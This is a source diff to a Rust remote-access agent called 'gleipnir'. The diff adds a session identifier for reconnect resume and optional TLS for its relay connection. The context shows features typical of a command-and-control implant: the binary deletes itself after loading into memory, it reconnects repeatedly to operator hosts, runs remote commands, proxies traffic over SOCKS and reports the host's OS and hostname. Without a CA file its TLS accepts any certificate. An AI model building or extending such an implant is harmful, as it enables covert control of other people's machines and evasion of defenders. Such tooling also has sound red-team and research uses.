@@ -49,6 +49,20 @@ struct Cli {
     /// Delete the binary after loading into memory (Linux only)
     #[arg(long)]
     self_delete: bool,
+
+    /// Stable session identifier for reconnect resume (auto-generated if omitted)
+    #[arg(long)]
+    session_id: Option<String>,
+
+    /// Enable TLS for the relay connection
+    #[cfg(feature = "tls")]
+    #[arg(long)]
+    tls: bool,
+
+    /// CA certificate file (PEM) for TLS verification. Without this, any cert is accepted.
+    #[cfg(feature = "tls")]
+    #[arg(long)]
+    tls_ca: Option<String>,
 }
 
 #[tokio::main]
@@ -83,27 +97,37 @@ async fn main() {
         persist::self_delete();
     }
 
+    let session_id = platform::resolve_session_id(cli.session_id);
     info!(
-        "gleipnir agent starting, targets {:?}:{}",
-        cli.host, cli.port
+        "gleipnir agent starting, targets {:?}:{}, session_id={}",
+        cli.host, cli.port, session_id
     );
 
     let config = ConnectConfig {
         hosts: cli.host,
         port: cli.port,
         max_retry_interval: cli.max_retry_interval,
+        #[cfg(feature = "tls")]
+        tls: if cli.tls {
+            Some(connect::build_tls_config(cli.tls_ca.as_deref()))
+        } else {
+            None
+        },
     };
     let cmd_timeout = cli.cmd_timeout;
+    let sid = session_id.clone();
 
     connect::connect_loop(&config, move |framed| {
-        tokio::spawn(session_loop(framed, cmd_timeout))
+        let sid = sid.clone();
+        tokio::spawn(session_loop(framed, cmd_timeout, sid))
     })
     .await;
 }
 
 async fn session_loop(
-    mut framed: Framed<tokio::net::TcpStream, protocol::GleipnirCodec>,
+    mut framed: Framed<connect::BoxedStream, protocol::GleipnirCodec>,
     cmd_timeout: u64,
+    session_id: String,
 ) {
     let executor = Executor::new();
     let socks_agent = SocksAgent::new();
@@ -111,11 +135,14 @@ async fn session_loop(
     // Channel for outbound frames (SOCKS data flows back through here)
     let (outbound_tx, mut outbound_rx) = mpsc::channel::<Frame>(256);
 
-    // Send platform info
-    let info = platform::PlatformInfo::detect();
+    // Send platform info with session_id for resume
+    let info = platform::PlatformInfo::detect().with_session_id(Some(session_id));
     info!(
-        "sending platform info: {} {} {}",
-        info.os, info.arch, info.hostname
+        "sending platform info: {} {} {} sid={}",
+        info.os,
+        info.arch,
+        info.hostname,
+        info.session_id.as_deref().unwrap_or("none")
     );
     let info_frame = Frame::new(
         FrameType::InfoResponse,
